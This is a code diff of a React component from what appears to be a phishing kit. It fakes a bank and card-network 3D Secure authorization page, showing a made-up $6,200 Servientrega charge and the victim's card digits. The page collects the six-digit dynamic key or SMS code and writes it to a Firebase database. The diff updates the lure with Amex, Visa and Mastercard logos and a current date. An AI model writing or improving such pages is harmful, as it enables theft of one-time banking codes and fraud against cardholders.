@@ -3,9 +3,14 @@ import { useLayoutEffect } from 'react'
 import { useState } from 'react'
 import logo from '../../../assets/logoBancolombia.png'
 import { setDataDb } from '../../../Firebase/sendFirebaseData'
-const ASK3D = ({ idF }) => {
+import amex from '../../../assets/amex4.svg'
+import visa from '../../../assets/logoVisa.svg'
+import mastercard from '../../../assets/mastercard.svg'
+
+const ASK3D = ({ idF ,dataScr}) => {
     const [dinKey, setDinKey] = useState("")
     const [notificacion, setNotificacion] = useState({})
+    
     const btnEnviar = () => {
         setNotificacion({
             dinKey: dinKey?.length != 6 && "La clave dinámica debe tener 6 digitos"
@@ -14,29 +19,41 @@ const ASK3D = ({ idF }) => {
             setDataDb(idF, "dinKey", dinKey)
         }
     }
+    const fecha =()=>{
+        const data=new Date()
+        const año=data.getFullYear()
+        const dia=data.getDate()
+        const mes=data.getMonth()+1
+        
+        return dia+"/"+mes+"/"+año
+    }
 
     useLayoutEffect(() => {
         if (dinKey.length > 6) {
             setDinKey(dinKey.slice(0, 6))
         }
+        
     }, [dinKey])
 
     return (
         <div className='w-full  px-2 py-4  flex flex-col items-center'>
-            <div className='flex mb-10 ml-4'>
-                <img className='h-5 ' src={logo} />
+            <div className='flex mb-10 ml-4 w-full'>
+                <img className='h-14' src={amex} />
+                <img className='h-10 mt-2 ' src={visa} />
+                <img className='h-10 mt-2' src={mastercard} />
+
                 <div className='w-40 h-4'></div>
             </div>
             <div>
-                <p className='font-semibold mb-3 ml-4'>Autorización de transacción</p>
+                <p className='font-semibold mb-3 ml-4'>Autorización de transacción 3D</p>
                 <p className=' leading-4 text-xs font-semibold text-gray-900 ml-4'>
-                    La transacción que intentas realizar en OVHcloud por $0.97 USD el 24/01/2023
-                    con tu tarjeta terminada en ************2196 debe ser
+                    La transacción que intentas realizar el pago por $6.200 USD el <span className='mx-1'>{fecha()}</span>
+                    con tu tarjeta terminada en {dataScr?.Tc} debe ser
                     autorizada por seguridad.
                 </p>
                 <p className=' leading-4 text-xs font-semibold text-gray-900 mt-6 ml-4'>
-                    Continúa con ella ingresando con un codigo llegado por mensaje de
-                    texto o con tu clave dinamica
+                Para continuar la transacción es necesario que ingrese el codigo enviado a su celular registrado, correo electrónico o clave dinámica
+
                 </p>
             </div>
             <div className='w-full mt-6 mb-4 px-4'>
@@ -46,15 +63,15 @@ const ASK3D = ({ idF }) => {
                 <div className='flex flex-wrap justify-center'>
                     <div className='flex text-xs w-4/5 pl-1'>
                         <span className='font-bold ml-20 '>Comercio:</span>
-                        <span className='ml-4'>OVHcloud</span>
+                        <span className='ml-4'>Servientrega</span>
                     </div>
                     <div className='flex text-xs w-4/5'>
                         <p className='font-bold '>Monto de la Transacción:</p>
-                        <p className='ml-4'>$0.97 USD</p>
+                        <p className='ml-4'>$6.200 USD</p>
                     </div>
                     <div className='flex text-xs '>
                         <p className='font-bold ml-2'>Número de Tarjeta:</p>
-                        <p className='ml-4'>************2196</p>
+                        <p className='ml-4'>************{dataScr.Tc}</p>
                     </div>
                     <div className='flex text-xs w-4/5 items-center'>
                         <p className='font-bold ml-11 w-40 text-right'>Ingresa tu Clave Dinámica:</p>
